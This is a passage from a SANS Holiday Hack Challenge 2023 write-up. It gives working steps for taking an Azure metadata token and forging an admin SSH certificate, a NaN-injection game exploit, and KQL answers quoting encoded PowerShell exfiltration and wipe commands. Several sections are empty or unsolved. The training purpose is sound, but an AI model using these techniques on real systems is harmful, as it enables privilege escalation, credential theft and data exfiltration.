    PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
    _=/usr/bin/env
    ```

1. There seems to be no reference to the "TODO" list on the VM itself. We can now try to access Azure resources from the VM using the REST API, as indicated in the hint by _Sparkle Redberry_.

    ```bash
    # Get an Azure access token from the VM.
    monitor@ssh-server-vm:~$  curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
    {"access_token":"eyJ0eXAiOiJK...tyfEuTln-_Pw","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85002","expires_on":"1702770775","ext_expires_in":"86399","not_before":"1702684075","resource":"https://management.azure.com/","token_type":"Bearer"}
    monitor@ssh-server-vm:~$ TOKEN=$( curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r '.access_token' )

    # List subscriptions.
    # Refer to the REST API reference for Azure, https://learn.microsoft.com/en-us/rest/api/azure/?view=rest-appservice-2022-03-01.
    monitor@ssh-server-vm:~$ curl -s https://management.azure.com/subscriptions?api-version=2022-12-01 -HAuthorization:"Bearer $TOKEN" | jq
    {
      "value": [
        {
          "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64",
          "authorizationSource": "RoleBased",
          "managedByTenants": [],
          "tags": {
            "sans:application_owner": "SANS:R&D",
            "finance:business_unit": "curriculum"
          },
          "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
          "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
          "displayName": "sans-hhc",
          "state": "Enabled",
          "subscriptionPolicies": {
            "locationPlacementId": "Public_2014-09-01",
            "quotaId": "EnterpriseAgreement_2014-09-01",
            "spendingLimit": "Off"
          }
        }
      ],
      "count": {
        "type": "Total",
        "value": 1
      }
    }

    # List resource groups.
    monitor@ssh-server-vm:~$ curl -s https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups?api-version=2022-12-01 -HAuthorization:"Bearer $TOKEN" | jq
    {
      "value": [
        {
          "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
          "name": "northpole-rg1",
          "type": "Microsoft.Resources/resourceGroups",
          "location": "eastus",
          "tags": {},
          "properties": {
            "provisioningState": "Succeeded"
          }
        }
      ]
    }

    # List web apps.
    monitor@ssh-server-vm:~$ curl -s https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups/northpole-rg1/providers/Microsoft.Web/sites?api-version=2022-03-01 -HAuthorization:"Bearer $TOKEN"
    {"value":[]}

    # Get source code (check hint). Use the Function App FQDN as the site name.
    monitor@ssh-server-vm:~$ curl -s https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01 -HAuthorization:"Bearer $TOKEN" | jq
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web",
      "name": "northpole-ssh-certs-fa",
      "type": "Microsoft.Web/sites/sourcecontrols",
      "location": "East US",
      "tags": {
        "project": "northpole-ssh-certs",
        "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl"
      },
      "properties": {
        "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
        "branch": "main",
        "isManualIntegration": false,
        "isGitHubAction": true,
        "deploymentRollbackEnabled": false,
        "isMercurial": false,
        "provisioningState": "Succeeded",
        "gitHubActionConfiguration": {
          "codeConfiguration": null,
          "containerConfiguration": null,
          "isLinux": true,
          "generateWorkflowFile": true,
          "workflowSettings": {
            "appType": "functionapp",
            "publishType": "code",
            "os": "linux",
            "variables": {
              "runtimeVersion": "3.11"
            },
            "runtimeStack": "python",
            "workflowApiVersion": "2020-12-01",
            "useCanaryFusionServer": false,
            "authType": "publishprofile"
          }
        }
      }
    }
    ```

1. Search the [github repo](https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa) obtained from the previous step for any reference to a "cookie cache" or "todo" list. No search relevant reference was found.

1. Inspect the [function_app.py](https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa/blob/main/function_app.py) file. Notice that the REST API accepts the "principal" as well, as observed earlier.

1. Go back to the VM and inspect the SSH config inside.

    ```bash
    monitor@ssh-server-vm:~$ ls -al /home/alabaster/
    ls: cannot open directory '/home/alabaster/': Permission denied

    monitor@ssh-server-vm:~$ ls -al /etc/ssh
    total 620
    drwxr-xr-x 1 root root   4096 Nov  9 14:07 .
    drwxr-xr-x 1 root root   4096 Dec 20 16:41 ..
    drwxr-xr-x 1 root root   4096 Nov  7 21:37 auth_principals
    -rw-r--r-- 1 root root    107 Nov  9 14:07 ca.pub
    -rw-r--r-- 1 root root 573928 Sep 23 22:11 moduli
    -rw-r--r-- 1 root root   1650 Sep 23 22:11 ssh_config
    drwxr-xr-x 1 root root   4096 Sep 23 22:11 ssh_config.d
    -rw------- 1 root root    411 Nov  7 21:37 ssh_host_ed25519_key
    -rw-r--r-- 1 root root    505 Nov  7 21:37 ssh_host_ed25519_key-cert.pub
    -rw-r--r-- 1 root root     81 Nov  7 21:37 ssh_host_ed25519_key.pub
    -rw------- 1 root root   2610 Nov  7 21:37 ssh_host_rsa_key
    -rw-r--r-- 1 root root    973 Nov  7 21:37 ssh_host_rsa_key-cert.pub
    -rw-r--r-- 1 root root    553 Nov  7 21:37 ssh_host_rsa_key.pub
    -rw-r--r-- 1 root root   3223 Sep 23 22:11 sshd_config
    drwxr-xr-x 1 root root   4096 Nov  7 21:37 sshd_config.d

    monitor@ssh-server-vm:~$ vi /etc/ssh/sshd_config
    ## nothing of importance

    monitor@ssh-server-vm:~$ vi /etc/ssh/sshd_config.d/sshd_config_certs.conf
    ...
    AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u
    ...

    monitor@ssh-server-vm:~$ ls /etc/ssh/auth_principals/
    alabaster  monitor

    monitor@ssh-server-vm:~$ cat /etc/ssh/auth_principals/monitor
    elf
    monitor@ssh-server-vm:~$ cat /etc/ssh/auth_principals/alabaster
    admin
    ```

    We can see that the user "alabaster" can login with the "admin" principal.

1. Request a certificate with the "admin" principal from the Azure function app. The contents of the "ssh_pub_key" key in the JSON request body should be the contents of the OpenSSH public key. Save the value of the JSON key "ssh_cert" from the response in a new file called _monitor-cert-admin.pub_.

    ```bash
    $ curl 'https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' -H 'content-type: application/json' \
      --data-raw '{"ssh_pub_key":"ssh-rsa AAAAB...49tufvYik= monitor","principal":"admin"}'
    ```

1. SSH to the VM as "alabaster".

    ```bash
    ssh -F /dev/null -oUserKnownHostsFile=/dev/null -i monitor -oCertificateFile=monitor-cert-admin.pub alabaster@ssh-server-vm.santaworkshopgeeseislands.org
    ```

1. Get the TODO list.

    ```bash
    alabaster@ssh-server-vm:~$ cat alabaster_todo.md
    # Geese Islands IT & Security Todo List

    - [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
    - [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
    - [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
    - [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
    - [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
    - [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
    - [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
    ```

    Alabaster is trying to implement is a __"gingerbread"__ cookie cache.

### Na'an

##### Elf for Conversation
Shifty McShuffles

##### Question explanation
The objective is to defeat the elf in a game of cards with a hint revealed in a link to the blog, [Python NaN Injection](https://www.tenable.com/blog/python-nan-injection).

###### Hints
1. Shifty said his deck of cards is made with Python. Surely there's a [weakness](https://www.tenable.com/blog/python-nan-injection) to give you the upper hand in his game.
1. Try to outsmart Shifty by sending him an error he may not understand.

##### Solution

1. Inputting card numbers like 0,1,2,9,8 or 0,1,9,8,7 usually resulted in a tie.
1. The cards also allowed the input 'nan' on any one card. This made the player's score increase by 2 in every game, but the score seems to overflow after 9 and resets to 0.
1. A sample HTTP POST request that the browser makes to submit the cards set by the player is shown below.

    ```bash
    curl 'https://nannannannannannan.com/action?id=abcdef01-2345-6789-abcd-ef0123456789' -s -c /tmp/xcookies -b /tmp/xcookies \
      -H 'accept: application/json, text/javascript, */*; q=0.01' \
      -H 'content-type: application/json' \
      -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \
      -H 'x-requested-with: XMLHttpRequest' \
      --data-raw '{"play":"nan,0,9,1,8"}'
    ```

1. The above request also accept's a JSON request body like `{"play":"nan,nan,nan,9.0,0.0"}`.
1. Sending invalid JSON request data `{"play":1}` dumps part of the Python code in the error.

    ```json
    {"data":"Error in function named play_cards:\n\ndef play_cards(csv_card_choices, request_id):\n  try:\n    f = StringIO(csv_card_choices)\n    reader = csv.reader(f, delimiter=',')\n    player_cards = []\n    for row in reader:\n      for n in row:\n        n = float(n)\n        if is_valid_whole_number_choice(n) and n not in [x['num'] for x in player_cards]:\n          player_cards.append({\n            'owner':'p',\n            'num':n\n          })\n      break\n    if len(player_cards) != 5:\n      return jsonify({\"request\":False,\"data\": f\"Requires 5 unique values but was given \\\"{csv_card_choices}\\\"\" })\n    player_cards = sorted(player_cards, key=lambda d: d['num'])\n    shiftys_cards = shifty_mcshuffles_choices( player_cards )\n    all_cards = []\n    for p in player_cards:\n      if p['num'] not in [x['num'] for x in shiftys_cards]:\n        all_cards.append(p)\n    for s in shiftys_cards:\n      if s['num'] not in [x['num'] for x in player_cards]:\n        all_cards.append(s)\n    maxItem = False\n    minItem = False\n    if bool(len(all_cards)):\n      maxItem = max(all_cards, key=lambda x:x['num'])\n      minItem = min(all_cards, key=lambda x:x['num'])\n    p_starting_value = int(session.get('player',0))\n    s_starting_value = int(session.get('shifty',0))\n    if bool(maxItem):\n      if maxItem['owner'] == 'p':\n        session['player'] = str( p_starting_value + 1 )\n      else:\n        session['shifty'] = str( s_starting_value + 1 )\n    if bool(minItem):\n      if minItem['owner'] == 'p':\n        session['player'] = str( int(session.get('player',0)) + 1 )\n      else:\n        session['shifty'] = str( int(session.get('shifty',0)) + 1 )\n    score_message, win_lose_tie_na = win_lose_tie_na_calc( int(session.get('player',0)), int(session.get('shifty',0)) )\n    play_message = 'Ha, we tied!'\n    if int(session['player']) - p_starting_value > int(session['shifty']) - s_starting_value:\n      play_message = 'Darn, how did I lose that hand!'\n    elif int(session['player']) - p_starting_value < int(session['shifty']) - s_starting_value:\n      play_message = 'I win and you lose that hand!'\n    if win_lose_tie_na in ['w','l','t']:\n      session['player'] = '0'\n      session['shifty'] = '0'\n    msg = { \"request\":True, \"data\": {\n      'player_cards':player_cards,\n      'shiftys_cards':shiftys_cards,\n      'maxItem':maxItem,\n      'minItem':minItem,\n      'player_score':int(session['player']),\n      'shifty_score':int(session['shifty']),\n      'score_message': score_message,\n      'win_lose_tie_na': win_lose_tie_na,\n      'play_message':play_message,\n    } }\n    if win_lose_tie_na == \"w\":\n      msg[\"data\"]['conduit'] = { 'hash': hmac.new(submissionKey.encode('utf8'), request_id.encode('utf8'), sha256).hexdigest(), 'resourceId': request_id }\n    return jsonify( msg )\n  except Exception as e:\n    err = f\"{type(e).__name__} at line {e.__traceback__.tb_lineno} of {__file__}: {e}\"\n    raise ValueError(err)\n\n\nValueError at line 172 of /root/webserver/webserver.py: ValueError at line 97 of /root/webserver/webserver.py: could not convert string to float: 'a'","request":false}
    ```

1. The game needs to be won by playing in the iFrame. Playing cards like "nan", "NAN", "NaN", "Nan", "NAn" or any other different case-combination of the string "nan" can be used 5 times to win.

### Phish Detection Agency

##### Elf for Conversation
Fitzy Shortstack

##### Question explanation
The "Phishing" folder contained potential phishing emails that needed to be analyzed for false positives and false negatives.

###### Hints
1. Discover the essentials of email security with DMARC, DKIM, and SPF at [Cloudflare's Guide](https://www.cloudflare.com/learning/email-security/dmarc-dkim-spf/).

##### Solution

The expected DMARC signature is `DKIM-Signature: v=1; a=rsa-sha256; d=geeseislands.com; s=default; b=HJgZP0lGJb8xK3t18YsOUpZ+YvgcCj2h3ZdCQF/TN0XQlWgZt4Ll3cEjy1O4Ed9BwFkN8XfOaKJbnN+lCzA8DyQ9PDPkT9PeZw2+JhQK1RmZdJlfg8aIlXvB2Jy2b2RQlKcY0a5+j/48edL9XkF2R8jTtKgZd9JbOOyD4EHD6uLX5;`. Emails that failed to match the signature or failed the DMARC check were phishing emails.

### KQL Kraken Hunt

##### Elf for Conversation
Tangle Coalbox

##### Question explanation

There is a network infection that needs to be investigated using KQL in Azure Data Explorer. Details of the investigation case is mentioned [here]((https://detective.kusto.io/sans2023)).

Before beginning, a [free cluster](https://dataexplorer.azure.com/freecluster) needs to be created and the relevant data for the investigation into it.

###### Hints
1. Outbound Connections: Do you need to find something that happened via a process? Pay attention to the _ProcessEvents_ table!
1. Once you get into the Kusto trainer, click the blue Train me for the case button to get familiar with KQL.
1. Looking for a file that was created on a victim system? Don't forget the _FileCreationEvents_ table.

##### Solution

Below is the list of questions asked in order, their answers, and the KQL queries used to answer them. If a question does not contain the query, its answer can be found in the previous queries.

Onboarding
1. How many Craftperson Elf's are working from laptops? `25`

    ```sql
    Employees
    | where role == "Craftsperson Elf" and hostname endswith "-LAPTOP" | count
    ```

Case 1

1. What is the email address of the employee who received this phishing email? The user clicked the malicious link 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'. `alabaster_snowball@santaworkshopgeeseislands.org`

    ```sql
    Email
    | where link == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
    ```

1. What is the email address that was used to send this spear phishing email? `cwombley@gmail.com`

1. What was the subject line used in the spear phishing email? `[EXTERNAL] Invoice foir reindeer food past due`

Case 2

1. What is the role of our victim in the organization? `Head Elf`

    ```sql
    Employees
    | where email_addr == "alabaster_snowball@santaworkshopgeeseislands.org"
    ```

1. What is the hostname of the victim's machine? `Y1US-DESKTOP`

1. What is the source IP linked to the victim? `10.10.0.4`

Case 3

1. What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs! `2023-12-02T10:12:42Z`

    ```sql
    OutboundNetworkEvents
    | where url == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
    ```

1. What file is dropped to Alabaster's machine shortly after he downloads the malicious file? `giftwrap.exe`

    ```sql
    FileCreationEvents
    | where timestamp >= datetime("2023-12-02T10:12:42Z") and hostname == "Y1US-DESKTOP" | take 10
    ```

Case 4

1. The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to? `113.37.9.17` from the process with `process_name == "ligolo"`

    ```sql
    ProcessEvents
    | where timestamp >= datetime("2023-12-02T10:12:42Z") and hostname == "Y1US-DESKTOP"
    ```

1. What is the timestamp when the attackers enumerated network shares on the machine? `2023-12-02T16:51:44Z` from `process_commandline == "net share"`

1. What was the hostname of the system the attacker moved laterally to? `NorthPolefileshare` from the `process_commandline == "cmd.exe /C net use \\\\NorthPolefileshare\\c$ /user:admin AdminPass123"`

Case 5

1. When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine? `2023-12-24T16:07:47Z` was the first command after the exfiltration attempt.

    ```sql
    ProcessEvents
    | where timestamp >= datetime("2023-12-02T10:12:42Z") and hostname == "Y1US-DESKTOP" and process_name == "powershell.exe"
    ```

1. What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding) `NaughtyNiceList.txt`

    ```sql
    ProcessEvents
    | where timestamp >= datetime("2023-12-02T10:12:42Z") and hostname == "Y1US-DESKTOP" and process_commandline contains "-enc"
    ```

    These 3 process commandlines in the output of the query are relevant.
    ```
    C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn

    C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4=

    C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=
    ```

    1. The commands need to be base64 decoded first.
    1. The first indicates a command encoded as a reversed string, for copying a file called `NaughtyNiceList.txt` from the Fileshare to the Desktop.
    1. The second indicates a command encoding ASCII as integers, for exfiltrating the file.
    1. The last base64 decodes to `C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\`.

1. The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to? `giftbox.com`

Case 6

1. What is the name of the executable the attackers used in the final malicious command? `downwithsanta.exe`

1. What was the command line flag used alongside this executable? `--wipeall`

After finishing all 6 cases, the answer to the challenge is presented as the following base64 encoded string, `'QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw=='`.

### Game Cartridges: Vol 3

##### Elf for Conversation
[Angel Candysalt](#angel-candysalt-rusty-quay)

##### Question explanation

###### Hints
1. This one is a bit long, it never hurts to save your progress!
1. 8bit systems have much smaller registers than you’re used to.
1. Isn’t this great?!? The coins are OVERFLOWing in their abundance.

##### Solution

### Active Directory

##### Elf for Conversation
[Ribb Bonbowford](#ribb-bonbowford-coggoggle-marina)

##### Question explanation

The elf's conversation suggests that [Alabaster](#certificate-sshenanigans) deployed vulnerable Function App code in the Azure production environment in which there is an Active directory server. The AD server contains a file share used by a _Wombley Cube's_ department to store sensitive data. Alabaster's SSH account could aid in exploring the Azure environment with some tools.

The objective is to find the name of the secret file in the inaccessible folder on the _FileShare_.

###### Hints
1. It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.

##### Solution

1. Login back to the VM in [Certificate SSHenanigans](#certificate-sshenanigans) with Alabaster's account credentials and get an Azure access token.

    ```bash
    ssh -F /dev/null -oUserKnownHostsFile=/dev/null -i monitor -oCertificateFile=monitor-cert-admin.pub alabaster@ssh-server-vm.santaworkshopgeeseislands.org
    alabaster@ssh-server-vm:~$ TOKEN=$( curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r '.access_token' )
    ```

1. Explore for tools inside the VM.

    ```bash
    alabaster@ssh-server-vm:~$ ls
    alabaster_todo.md  impacket
    alabaster@ssh-server-vm:~$ ls impacket/
    DumpNTLMInfo.py     kintercept.py         rpcmap.py
    Get-GPPPassword.py  lookupsid.py          sambaPipe.py
    GetADUsers.py       machine_role.py       samrdump.py
    GetNPUsers.py       mimikatz.py           secretsdump.py
    GetUserSPNs.py      mqtt_check.py         services.py
    addcomputer.py      mssqlclient.py        smbclient.py
    atexec.py           mssqlinstance.py      smbexec.py
    certipy             net.py                smbpasswd.py
    changepasswd.py     netview.py            smbrelayx.py
    dcomexec.py         nmapAnswerMachine.py  smbserver.py
    dpapi.py            ntfs-read.py          sniff.py
    esentutl.py         ntlmrelayx.py         sniffer.py
    exchanger.py        ping.py               split.py
    findDelegation.py   ping6.py              ticketConverter.py
    getArch.py          psexec.py             ticketer.py
    getPac.py           raiseChild.py         tstool.py
    getST.py            rbcd.py               wmiexec.py
    getTGT.py           rdp_check.py          wmipersist.py
    goldenPac.py        reg.py                wmiquery.py
    karmaSMB.py         registry-read.py
    keylistattack.py    rpcdump.py
    ```

    [UNSOLVED]

### Space Island Door Access Speaker

##### Elf for Conversation
Jewel Loggins

##### Question explanation

The elf mentions that the only other person they saw at the island was Wombley Cube, who was also mentioned in the [Active Directory](#active-directory) challenge. Wombley Cube uses a tram whose doors open with a secret spoken passphrase. [Ribb Bonbowford](#ribb-bonbowford-coggoggle-marina) who works with Wombley might also know.

###### Hints

##### Solution

### Snowball Fight

##### Elf for Conversation
Morcel Nougat

##### Question explanation

Mode: vs Santa
1. Random Match Making - Chosen
2. Create Private Room
3. Join Private Room

##### Solution

### Reportinator

##### Elf for Conversation
Noel Boetie

##### Question explanation

##### Solution

### The Captain's Comms

##### Elf for Conversation
Chimney Scissorsticks

The elf asks to solve the [challenge](#elf-hunt) at Rainraster Cliffs on Pixel Island for _Piney Sappington_ first.

##### Question explanation

##### Solution

## Extra's

### Conversations

#### Pepper Minstix (Rudolph's Rest Resort Lobby)
Asks to come back after solving everything.
> TODO;

#### Ribb Bonbowford (Coggoggle Marina)
Asks to check with [Alabaster Snowball](#certificate-sshenanigans) at Rainraster Cliffs on Pixel Island.

After solving [Certificate SSHenanigans](#certificate-sshenanigans), this is what the elf says.

```
Hello, I'm Ribb Bonbowford. Nice to meet you!
Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT.
Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing.
I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.
I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.
Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.
```

#### Tinsel Upatree (Driftbit Grotto)

```
I can't believe I was actually able to find this underground cavern!
I discovered what looked liike an old pirate map in the attic of one of those huts in Rainraster Cliffs, and it actually led somewhere!
But now that I've seen where it leads, I think this might've been a bad idea. This place is scary! Maybe you want to take it from here?
...
There are 3 buried treasures in total, each in its own uncharted area around Geese Islands.
I've been searching for a bit, but the mustiness down here is making me sneeze!
Maybe you'll be able to find it. Here, use my Gameboy Cartridge Detector. Go into your items and test it to make sure it's still working.
When you get close to the treasure, it'll start sounding off. The closer you get, the louder the sound.
No need to activate or fiddle with it. It just works!
I bet it's somewhere right... near... ACHOOO!
If you find the treasure, come back and show me, and I'll tell you what I was able to research about it.
Good luck!
```

A new item called a "Game Boy Cartridge Detector" gets added to the list of Items on the portal.

TODO;

#### Angel Candysalt (Rusty Quay)

The elf asks us to find our way through the labyrinth of the ship graveyard to the [treasure](#game-cartridges-vol-3) detected by the Gameboy Cartridge. Once found, the elf reveals more secrets about [Game Cartridges: Vol 3](#game-cartridges-vol-3).

###### Hints
1. The location of the treasure in Rusty Quay is marked by a shiny spot on the ground. To help with navigating the maze, try zooming out and changing the camera angle.

#### Wombley Cube (Chiaroscuro City)
The elf shares an audio file with the story of the Geese islands.
